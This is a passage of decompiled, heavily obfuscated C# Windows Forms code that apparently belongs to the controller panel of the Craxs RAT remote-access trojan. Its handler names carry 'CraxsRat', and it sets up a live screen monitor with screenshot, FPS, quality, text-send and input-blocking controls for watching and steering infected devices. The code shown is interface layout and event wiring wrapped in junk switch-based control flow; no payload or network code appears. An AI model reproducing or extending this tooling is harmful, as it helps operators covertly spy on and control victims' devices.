              (object) EXGuarder.\u0037430360C
            });
            this.SKtype.Location = new Point(0, 365);
            num1 = (int) num3 * 1185252575 ^ -1004508097;
            continue;
          case 342:
            this.SKtype.Font = new Font(EXGuarder.\u00312702070, 9f);
            num1 = (int) num3 * -1559943778 ^ -431570781;
            continue;
          case 343:
            this.DrakeUIAvatar3.Location = new Point(0, 820);
            num1 = (int) num3 * 711961582 ^ 1523648744;
            continue;
          case 344:
            this.combosize.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1590277667 ^ 295884898;
            continue;
          case 345:
            this.DrakeUIAvatar9.FillColor = Color.Transparent;
            this.DrakeUIAvatar9.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -1834269089 ^ 204955648;
            continue;
          case 346:
            this.combosize.ForeColor = Color.FromArgb(65, 177, 225);
            this.combosize.Location = new Point(0, 596);
            num1 = (int) num3 * -834905498 ^ 2113340621;
            continue;
          case 347:
            this.Save.Size = new Size(100, 69);
            this.Save.Style = UIStyle.Custom;
            this.Save.StyleCustomMode = true;
            num1 = (int) num3 * -633476448 ^ -197134109;
            continue;
          case 348:
            this.PBS.ShowValue = false;
            this.PBS.Size = new Size(392, 23);
            this.PBS.Style = UIStyle.Custom;
            num1 = (int) num3 * 325539674 ^ -1315843636;
            continue;
          case 349:
            this.FPSBOX.Name = EXGuarder.\u00306180E5B;
            num1 = (int) num3 * -1587529257 ^ -659683341;
            continue;
          case 350:
            this.PictureBox2.Size = new Size(40, 39);
            num1 = (int) num3 * 1896253600 ^ 1934094687;
            continue;
          case 351:
            this.Panel8.BackColor = Color.Black;
            this.Panel8.Controls.Add((Control) this.toptitle);
            num1 = (int) num3 * -1935641812 ^ -1095456432;
            continue;
          case 352:
            this.Dismisbtn.Dock = DockStyle.Top;
            num1 = (int) num3 * -934819444 ^ 1015444736;
            continue;
          case 353:
            ((ISupportInitialize) this.PictureBox3).BeginInit();
            ((ISupportInitialize) this.PictureBox2).BeginInit();
            this.Panel5.SuspendLayout();
            num1 = (int) num3 * -912688370 ^ -533297884;
            continue;
          case 354:
            this.Label6 = new Label();
            num1 = (int) num3 * 756367841 ^ -221719041;
            continue;
          case 355:
            this.Livepicbox.TabIndex = 1;
            this.Livepicbox.TabStop = false;
            num1 = (int) num3 * -832207134 ^ 716461203;
            continue;
          case 356:
            this.Panel2.Location = new Point(0, 0);
            this.Panel2.Margin = new Padding(4);
            num1 = (int) num3 * 2066050536 ^ 541990069;
            continue;
          case 357:
            this.Label7 = new Label();
            num1 = (int) num3 * 1363941096 ^ 59881991;
            continue;
          case 358:
            this.FPSBOX = new DrakeUIComboBox();
            this.Label4 = new Label();
            num1 = (int) num3 * -1233243120 ^ 882397611;
            continue;
          case 359:
            this.textsend.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num3 * -1694205647 ^ 1976153082;
            continue;
          case 360:
            ((ISupportInitialize) this.PictureBox2).EndInit();
            num1 = (int) num3 * 600953410 ^ -481497281;
            continue;
          case 361:
            this.Qualtibox.FillColor = Color.Black;
            num1 = (int) num3 * -1068104879 ^ 733666687;
            continue;
          case 362:
            this.DrakeUIAvatar4.AvatarSize = 45;
            this.DrakeUIAvatar4.Cursor = Cursors.Hand;
            num1 = (int) num3 * -609932154 ^ -107935799;
            continue;
          case 363:
            this.pinbtn.RectColor = Color.Transparent;
            this.pinbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1148811905 ^ 559650187;
            continue;
          case 364:
            ((ISupportInitialize) this.PictureBox3).EndInit();
            num1 = (int) num3 * 1803593416 ^ -2036786916;
            continue;
          case 365:
            this.Panel5.Dock = DockStyle.Bottom;
            num1 = (int) num3 * -1063154724 ^ 1398141680;
            continue;
          case 366:
            this.Panel7.Controls.Add((Control) this.FPSBOX);
            num1 = (int) num3 * 997558761 ^ 1456994254;
            continue;
          case 367:
            this.textsend.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 722915908 ^ -1203375475;
            continue;
          case 368:
            this.DrakeUIAvatar4.SymbolSize = 25;
            num1 = (int) num3 * 235795836 ^ 1493120596;
            continue;
          case 369:
            this.Panel5 = new Panel();
            this.DrakeUIAvatar2 = new DrakeUIAvatar();
            this.textsend = new DrakeUITextBox();
            this.Panel6 = new Panel();
            this.Panel7 = new Panel();
            num1 = (int) num3 * 1492115602 ^ 148267907;
            continue;
          case 370:
            this.Panel7.Controls.Add((Control) this.StartButton);
            this.Panel7.Controls.Add((Control) this.Panel9);
            this.Panel7.Controls.Add((Control) this.DrakeUIAvatar4);
            this.Panel7.Controls.Add((Control) this.DrakeUIAvatar3);
            this.Panel7.Dock = DockStyle.Right;
            num1 = (int) num3 * 1002540231 ^ -1778511838;
            continue;
          case 371:
            this.checkblock.TabIndex = 30;
            this.checkblock.Text = EXGuarder.\u003215C772A;
            num1 = (int) num3 * -1357557488 ^ 1237733353;
            continue;
          case 372:
            this.textsend.Style = UIStyle.Custom;
            num1 = (int) num3 * -1594326015 ^ -1492325190;
            continue;
          case 373:
            this.DrakeUIAvatar9.TabIndex = 3;
            num1 = (int) num3 * 411613344 ^ 1448348989;
            continue;
          case 374:
            this.FPSBOX.Font = new Font(EXGuarder.\u00312702070, 9f);
            this.FPSBOX.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num3 * -335451058 ^ -1408310925;
            continue;
          case 375:
            this.vewpnl.Name = EXGuarder.\u003675B671E;
            this.vewpnl.Size = new Size(392, 731);
            num1 = (int) num3 * 733124405 ^ -912504980;
            continue;
          case 376:
            this.refreshtimer.Interval = 1;
            num1 = (int) num3 * 551783813 ^ -902402290;
            continue;
          case 377:
            this.toptitle.Location = new Point(0, 0);
            num1 = (int) num3 * 185430467 ^ 605250556;
            continue;
          case 378:
            this.DrakeUIAvatar1.Cursor = Cursors.Hand;
            this.DrakeUIAvatar1.FillColor = Color.Transparent;
            this.DrakeUIAvatar1.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -1671884943 ^ 1093118564;
            continue;
          case 379:
            this.Panel5.Controls.Add((Control) this.textsend);
            num1 = (int) num3 * 900374663 ^ 1662629465;
            continue;
          case 380:
            this.Label7.Visible = false;
            this.Label6.Dock = DockStyle.Top;
            num1 = (int) num3 * -1598591923 ^ -2082539435;
            continue;
          case 381:
            this.Label7.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * -1128393305 ^ -2054296237;
            continue;
          case 382:
            this.combosize.Visible = false;
            num1 = (int) num3 * 1279950796 ^ 2007987679;
            continue;
          default:
            goto label_384;
        }
      }
label_384:
      this.ResumeLayout(false);
    }

    internal virtual PictureBox Livepicbox
    {
      get => ((Updater) this)._Livepicbox;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.PictureBox1_MouseDown);
label_1:
        int num1 = 1151696514;
        PictureBox livepicbox;
        MouseEventHandler mouseEventHandler2;
        MouseEventHandler mouseEventHandler3;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~~-~num1 + ~1519996444) * -543702465)) % 11U)
          {
            case 0:
              livepicbox.MouseDown += mouseEventHandler1;
              livepicbox.MouseUp += mouseEventHandler2;
              livepicbox.MouseMove += mouseEventHandler3;
              num1 = (int) num2 * -550130567 ^ -2004039954;
              continue;
            case 1:
              int num3 = livepicbox == null ? -1350516499 : (num3 = 55033054);
              num1 = num3 ^ (int) num2 * -382670232;
              continue;
            case 2:
              livepicbox.MouseDown -= mouseEventHandler1;
              num1 = (int) num2 * 2105524053 ^ -25301322;
              continue;
            case 3:
              livepicbox = ((Updater) this)._Livepicbox;
              num1 = (int) num2 * 1570523685 ^ -1162175757;
              continue;
            case 4:
              ((Updater) this)._Livepicbox = value;
              num1 = 159686923;
              continue;
            case 5:
              livepicbox.MouseMove -= mouseEventHandler3;
              num1 = (int) num2 * 2045529866 ^ 1021041671;
              continue;
            case 6:
              mouseEventHandler2 = new MouseEventHandler(this.PictureBox1_MouseUp);
              mouseEventHandler3 = new MouseEventHandler(this.PictureBox1_MouseMove);
              num1 = (int) num2 * -213384712 ^ 247803735;
              continue;
            case 7:
              livepicbox.MouseUp -= mouseEventHandler2;
              num1 = (int) num2 * -1543125523 ^ -1758987073;
              continue;
            case 8:
              goto label_1;
            case 9:
              goto label_3;
            case 10:
              livepicbox = ((Updater) this)._Livepicbox;
              int num4 = livepicbox == null ? 766245957 : (num4 = -859331849);
              num1 = num4 ^ (int) num2 * -1713522237;
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
    }

    internal virtual Label Label1
    {
      get => ((Updater) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Label1 = value;
    }

    internal virtual Label Label2
    {
      get => ((Updater) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Label2 = value;
    }

    internal virtual Panel vewpnl
    {
      get => ((Updater) this)._vewpnl;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._vewpnl = value;
    }

    internal virtual DrakeUICheckBox Save
    {
      get => ((Updater) this)._Save;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Save_MouseClick);
label_1:
        int num1 = -1108599384;
        DrakeUICheckBox save;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~(num1 * -201225007 * -209872293) ^ -931497746) - -11111739)) % 9U)
          {
            case 0:
              save.MouseClick += mouseEventHandler;
              num1 = (int) num2 * -766133409 ^ -1542786376;
              continue;
            case 1:
              save = ((Updater) this)._Save;
              num1 = (int) num2 * 953402601 ^ -624254003;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num3 = save == null ? 2064255939 : (num3 = 1663879852);
              num1 = num3 ^ (int) num2 * 323968856;
              continue;
            case 4:
              save.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -1674039410 ^ 1269726999;
              continue;
            case 5:
              ((Updater) this)._Save = value;
              num1 = -1796496719;
              continue;
            case 6:
              int num4 = save == null ? -142215261 : (num4 = -1482162175);
              num1 = num4 ^ (int) num2 * -1865763828;
              continue;
            case 7:
              save = ((Updater) this)._Save;
              num1 = (int) num2 * -1133866735 ^ 759238579;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Updater) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Panel1 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((Updater) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel2_MouseDown);
label_1:
        int num1 = -404536068;
        Panel panel2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 - (--1959163745 - -(2076883547 * (-1883484057 * (-757938399 ^ -343864591)))) ^ (~(183728903 ^ -1023384271) ^ (700945667 + 938178765) * -500622743) * -1169413865) * -875637607 ^ -837453961 - -106707155 + (-5739512 - 1097093751) ^ -961889934 - 878297068) - 76931891)) % 8U)
          {
            case 0:
              int num3 = panel2 == null ? -1418302883 : (num3 = 621965659);
              num1 = num3 ^ (int) num2 * -1172676651;
              continue;
            case 1:
              panel2.MouseDown += mouseEventHandler;
              num1 = (int) num2 * 438641290 ^ -1070228829;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((Updater) this)._Panel2 = value;
              panel2 = ((Updater) this)._Panel2;
              num1 = 575884622;
              continue;
            case 4:
              int num4 = panel2 == null ? -1497327691 : (num4 = 1151224491);
              num1 = num4 ^ (int) num2 * 204593493;
              continue;
            case 5:
              panel2.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * -1296427905 ^ -724503618;
              continue;
            case 6:
              panel2 = ((Updater) this)._Panel2;
              num1 = (int) num2 * -1508052946 ^ 825715190;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel3
    {
      get => ((Updater) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel3_MouseDown);
label_1:
        int num1 = 1071357698;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Panel panel3;
          switch ((num3 = (uint) -(~-1649568361 - (-1821119633 * -559864013 - ~(964767128 ^ 29735601) - -~num2 + 2044922213))) % 8U)
          {
            case 0:
              panel3.MouseDown -= mouseEventHandler;
              num1 = (int) num3 * 476738439 ^ 1702710669;
              continue;
            case 1:
              panel3 = ((Updater) this)._Panel3;
              num1 = (int) num3 * -456303176 ^ 1308485041;
              continue;
            case 2:
              int num4 = panel3 == null ? -1735440449 : (num4 = -1995865231);
              num1 = num4 ^ (int) num3 * -577722779;
              continue;
            case 3:
              panel3 = ((Updater) this)._Panel3;
              int num5 = panel3 == null ? 811262131 : (num5 = -1046815270);
              num1 = num5 ^ (int) num3 * 717649983;
              continue;
            case 4:
              panel3.MouseDown += mouseEventHandler;
              num1 = (int) num3 * -1669816755 ^ -1671269182;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((Updater) this)._Panel3 = value;
              num1 = 1654118032;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel4
    {
      get => ((Updater) this)._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel4_MouseDown);
label_1:
        int num1 = 567450748;
        Panel panel4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * -1249230545 * -887283265) + ((-825806622 ^ 567687230) + ~1184449711))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              panel4 = ((Updater) this)._Panel4;
              int num3 = panel4 == null ? -1470061481 : (num3 = -290407986);
              num1 = num3 ^ (int) num2 * -254298745;
              continue;
            case 2:
              panel4 = ((Updater) this)._Panel4;
              int num4 = panel4 == null ? 1387022189 : (num4 = 1217806664);
              num1 = num4 ^ (int) num2 * 196607541;
              continue;
            case 3:
              panel4.MouseDown += mouseEventHandler;
              num1 = (int) num2 * 203001937 ^ -1510650311;
              continue;
            case 4:
              panel4.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * -1717451553 ^ 1405814033;
              continue;
            case 5:
              goto label_1;
            case 6:
              ((Updater) this)._Panel4 = value;
              num1 = -1519133068;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel5
    {
      get => ((Updater) this)._Panel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Panel5 = value;
    }

    internal virtual Panel Panel6
    {
      get => ((Updater) this)._Panel6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Panel6 = value;
    }

    internal virtual Panel Panel7
    {
      get => ((Updater) this)._Panel7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Panel7 = value;
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((Updater) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._DrakeUIToolTip1 = value;
    }

    internal virtual PictureBox PictureBox2
    {
      get => ((Updater) this)._PictureBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._PictureBox2 = value;
    }

    internal virtual PictureBox PictureBox3
    {
      get => ((Updater) this)._PictureBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._PictureBox3 = value;
    }

    internal virtual Timer Timer1
    {
      get => ((Updater) this)._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
label_1:
        int num1 = 1254583299;
        Timer timer1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(((num1 ^ ~(797927303 * (-27752993 ^ -1483671983) - (--759457407 - 509640745) + (82345855 ^ 862579695 - -313306676 ^ ~-657104784))) + (~-778920942 - (~157180259 - (-2042111382 ^ -147955103)) ^ (~-1981431680 ^ -955767956 - -1856284003) + -1905460313 * -26557313)) * -2363025)) % 8U)
          {
            case 0:
              int num3 = timer1 == null ? -1107199934 : (num3 = 1332638623);
              num1 = num3 ^ (int) num2 * -442034650;
              continue;
            case 1:
              ((Updater) this)._Timer1 = value;
              timer1 = ((Updater) this)._Timer1;
              num1 = -1334818628;
              continue;
            case 2:
              int num4 = timer1 == null ? 1320628361 : (num4 = 498318788);
              num1 = num4 ^ (int) num2 * -1587069634;
              continue;
            case 3:
              timer1.Tick += eventHandler;
              num1 = (int) num2 * 806408091 ^ -895455485;
              continue;
            case 4:
              timer1.Tick -= eventHandler;
              num1 = (int) num2 * -1294287644 ^ -119511995;
              continue;
            case 5:
              goto label_1;
            case 6:
              goto label_3;
            case 7:
              timer1 = ((Updater) this)._Timer1;
              num1 = (int) num2 * -1085822093 ^ 1345575947;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label4
    {
      get => ((Updater) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Label4 = value;
    }

    internal virtual Label Label5
    {
      get => ((Updater) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._Label5 = value;
    }

    internal virtual DrakeUIProcessBar PBS
    {
      get => ((Updater) this)._PBS;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Updater) this)._PBS = value;
    }

    internal virtual Timer refreshtimer
    {
      get => ((UpdatesScreen) this)._refreshtimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Refreshtimer_Tick);
label_1:
        int num1 = 759309573;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Timer refreshtimer;
          switch ((num3 = (uint) (--1959487804 - ~(~(num2 ^ -938635797 * ((--807146468 ^ --804326007 ^ -2111082565 * 714357979) - ~~-774690210)) * -645004967))) % 7U)
          {
            case 0:
              refreshtimer.Tick += eventHandler;
              num1 = (int) num3 * -937914133 ^ 491975576;
              continue;
            case 1:
              refreshtimer = ((UpdatesScreen) this)._refreshtimer;
              int num4 = refreshtimer == null ? -673720138 : (num4 = 594721299);
              num1 = num4 ^ (int) num3 * -2089421845;
              continue;
            case 2:
              int num5 = refreshtimer == null ? -1900543434 : (num5 = 123812462);
              num1 = num5 ^ (int) num3 * -1492789824;
              continue;
            case 3:
              refreshtimer.Tick -= eventHandler;
              num1 = (int) num3 * -377285174 ^ -1255888237;
              continue;
            case 4:
              ((UpdatesScreen) this)._refreshtimer = value;
              refreshtimer = ((UpdatesScreen) this)._refreshtimer;
              num1 = 1009237467;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label Label7
    {
      get => ((UpdatesScreen) this)._Label7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((UpdatesScreen) this)._Label7 = value;
    }

    internal virtual Label Label6
    {
      get => ((UpdatesScreen) this)._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((UpdatesScreen) this)._Label6 = value;
    }

    internal virtual DrakeUIComboBox combosize
    {
      get => ((UpdatesScreen) this)._combosize;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((UpdatesScreen) this)._combosize = value;
    }

    internal virtual Panel Panel8
    {
      get => ((UpdatesScreen) this)._Panel8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((UpdatesScreen) this)._Panel8 = value;
    }

    internal virtual Label toptitle
    {
      get => ((UpdatesScreen) this)._toptitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((UpdatesScreen) this)._toptitle = value;
    }

    internal virtual Timer presstimer
    {
      get => ((UpdatesScreen) this)._presstimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Presstimer_Tick);
        Timer presstimer = ((UpdatesScreen) this)._presstimer;
        if (presstimer == null)
          goto label_8;
label_1:
        int num1 = -312989571;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~-num1) % 7U)
          {
            case 0:
              int num3 = presstimer == null ? 2108970418 : (num3 = 559028437);
              num1 = num3 ^ (int) num2 * -1037646162;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_8;
            case 3:
              goto label_1;
            case 4:
              presstimer.Tick += eventHandler;
              num1 = (int) num2 * 299285264 ^ 2019321200;
              continue;
            case 5:
              presstimer = ((UpdatesScreen) this)._presstimer;
              num1 = (int) num2 * 110753759 ^ -953508378;
              continue;
            case 6:
              presstimer.Tick -= eventHandler;
              num1 = (int) num2 * 1372684549 ^ -1107483616;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((UpdatesScreen) this)._presstimer = value;
        num1 = -621666169;
        goto label_2;
      }
    }

    internal virtual DrakeUIComboBox Qualtibox
    {
      get => ((UpdatesScreen) this)._Qualtibox;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((UpdatesScreen) this)._Qualtibox = value;
    }

    internal virtual DrakeUIComboBox FPSBOX
    {
      get => ((WebViewMonitor) this)._FPSBOX;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._FPSBOX = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar1
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe);
label_1:
        int num1 = 1960177272;
        DrakeUIAvatar drakeUiAvatar1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * 1842180663 - (~-1342105280 - ~473562992 + -1915119547 * (1228594161 ^ -1750555472) ^ ~-618804441 ^ 1241117560 - -78471260 ^ 265945161 - 1402161074) ^ -1070362846 - -(375859979 * -1125628694)) * 34171617 * 284894295)) % 7U)
          {
            case 0:
              drakeUiAvatar1.Click -= eventHandler;
              num1 = (int) num2 * -1557502312 ^ -778841296;
              continue;
            case 1:
              drakeUiAvatar1.Click += eventHandler;
              num1 = (int) num2 * -1170426731 ^ 1863463849;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = drakeUiAvatar1 == null ? -914275051 : (num3 = 268044590);
              num1 = num3 ^ (int) num2 * 812159229;
              continue;
            case 4:
              ((WebViewMonitor) this)._DrakeUIAvatar1 = value;
              drakeUiAvatar1 = ((WebViewMonitor) this)._DrakeUIAvatar1;
              num1 = -705031706;
              continue;
            case 5:
              drakeUiAvatar1 = ((WebViewMonitor) this)._DrakeUIAvatar1;
              int num4 = drakeUiAvatar1 == null ? 244517538 : (num4 = -2107210560);
              num1 = num4 ^ (int) num2 * 433605053;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIAvatar scshotbtn
    {
      get => ((WebViewMonitor) this)._scshotbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj);
label_1:
        int num1 = -1840029241;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIAvatar scshotbtn;
          switch ((num3 = (uint) (1287107231 - ((--1736691907 + (863937317 - 2104647769) ^ 1169326835 - -318462051 - ~1651831028) - (-1848855950 - (~(-1762970295 - 1693654637) ^ ~-1758463919) - num2 * 1673280261)) * -1856234643 - 1498006647)) % 9U)
          {
            case 0:
              int num4 = scshotbtn == null ? -2110959144 : (num4 = -1882536976);
              num1 = num4 ^ (int) num3 * -790643885;
              continue;
            case 1:
              int num5 = scshotbtn == null ? -295917149 : (num5 = 1870105151);
              num1 = num5 ^ (int) num3 * -654309924;
              continue;
            case 2:
              scshotbtn = ((WebViewMonitor) this)._scshotbtn;
              num1 = (int) num3 * 722283550 ^ -773740011;
              continue;
            case 3:
              scshotbtn.Click += eventHandler;
              num1 = (int) num3 * -781400401 ^ -1427701435;
              continue;
            case 4:
              ((WebViewMonitor) this)._scshotbtn = value;
              num1 = -86937160;
              continue;
            case 5:
              scshotbtn = ((WebViewMonitor) this)._scshotbtn;
              num1 = (int) num3 * -167940637 ^ -221368259;
              continue;
            case 6:
              scshotbtn.Click -= eventHandler;
              num1 = (int) num3 * 157465378 ^ 1798170015;
              continue;
            case 7:
              goto label_1;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIComboBox SKtype
    {
      get => ((WebViewMonitor) this)._SKtype;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._SKtype = value;
    }

    public virtual DrakeUIAvatar Dismisbtn
    {
      get => ((WebViewMonitor) this)._Dismisbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Dismisbtn_Click);
label_1:
        int num1 = -1881154082;
        DrakeUIAvatar dismisbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~((num1 - ~(~1077288755 - ~-(697784584 - 525843385)) ^ ~(1184392362 + (646216730 - 318399291)) + (~1589329627 - (-636552953 ^ -1316335368)) * 1329434501) * 830206961) ^ --985222380)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              dismisbtn.Click += eventHandler;
              num1 = (int) num2 * 400127284 ^ 469345153;
              continue;
            case 2:
              dismisbtn.Click -= eventHandler;
              num1 = (int) num2 * -79762824 ^ -1457779407;
              continue;
            case 3:
              ((WebViewMonitor) this)._Dismisbtn = value;
              dismisbtn = ((WebViewMonitor) this)._Dismisbtn;
              num1 = 1284751808;
              continue;
            case 4:
              int num3 = dismisbtn == null ? -231031123 : (num3 = 153441875);
              num1 = num3 ^ (int) num2 * -1580019470;
              continue;
            case 5:
              int num4 = dismisbtn == null ? -1177115693 : (num4 = 1949983160);
              num1 = num4 ^ (int) num2 * -1743566806;
              continue;
            case 6:
              dismisbtn = ((WebViewMonitor) this)._Dismisbtn;
              num1 = (int) num2 * -1355527679 ^ -2048535383;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUICheckBox checkblock
    {
      get => ((WebViewMonitor) this)._checkblock;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkblock_MouseClick);
label_1:
        int num1 = -132420694;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUICheckBox checkblock;
          switch ((num3 = (uint) ((((-818497261 * -2002153374 + (1539893116 - 1755290014) ^ ~--1193884740) - (-1115050477 ^ -~-15616326) + ~(1179011399 * (-631226557 * 58649665) ^ -2058729087) - num2 - ((-1380807695 - 1345940378) * 45888005 ^ ~(~-1895524840 * 1071875599))) * -935466595 ^ -(1466754038 - -97291135)) * 974367129 - 841579939)) % 8U)
          {
            case 0:
              checkblock.MouseClick -= mouseEventHandler;
              num1 = (int) num3 * -1668699458 ^ 1022409281;
              continue;
            case 1:
              checkblock = ((WebViewMonitor) this)._checkblock;
              int num4 = checkblock == null ? 37894101 : (num4 = -454507031);
              num1 = num4 ^ (int) num3 * -187058156;
              continue;
            case 2:
              checkblock = ((WebViewMonitor) this)._checkblock;
              num1 = (int) num3 * 2062275605 ^ -1694622772;
              continue;
            case 3:
              goto label_3;
            case 4:
              ((WebViewMonitor) this)._checkblock = value;
              num1 = 1252680791;
              continue;
            case 5:
              int num5 = checkblock == null ? -1365554022 : (num5 = -1055935107);
              num1 = num5 ^ (int) num3 * -1405756714;
              continue;
            case 6:
              checkblock.MouseClick += mouseEventHandler;
              num1 = (int) num3 * -1526393124 ^ -1291137060;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUICheckBox chkctrl
    {
      get => ((WebViewMonitor) this)._chkctrl;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Chkctrl_MouseClick);
label_1:
        int num1 = -1484014866;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUICheckBox chkctrl;
          switch ((num3 = (uint) ((-91537393 - -1700323646 - (num2 - ((--219157693 ^ 125251565 * -1782905133 ^ 1972071681 * 1148417189) - 505910759 - (-320171005 ^ -965737046 * 422619793 - -1621449698 * 1207716451 - 577599024)) - (-1879770217 - -893503785 * (~-1513483829 - (89243916 ^ 1651707198)))) * -900896433 ^ -240077767) + 1326970907)) % 8U)
          {
            case 0:
              int num4 = chkctrl == null ? -1150074591 : (num4 = 2087011964);
              num1 = num4 ^ (int) num3 * 1288937728;
              continue;
            case 1:
              ((WebViewMonitor) this)._chkctrl = value;
              chkctrl = ((WebViewMonitor) this)._chkctrl;
              num1 = -75541795;
              continue;
            case 2:
              chkctrl.MouseClick -= mouseEventHandler;
              num1 = (int) num3 * 167904173 ^ 1797868874;
              continue;
            case 3:
              int num5 = chkctrl == null ? -1739279668 : (num5 = 2007502835);
              num1 = num5 ^ (int) num3 * 129018804;
              continue;
            case 4:
              goto label_3;
            case 5:
              chkctrl.MouseClick += mouseEventHandler;
              num1 = (int) num3 * 1365305352 ^ 1697244361;
              continue;
            case 6:
              goto label_1;
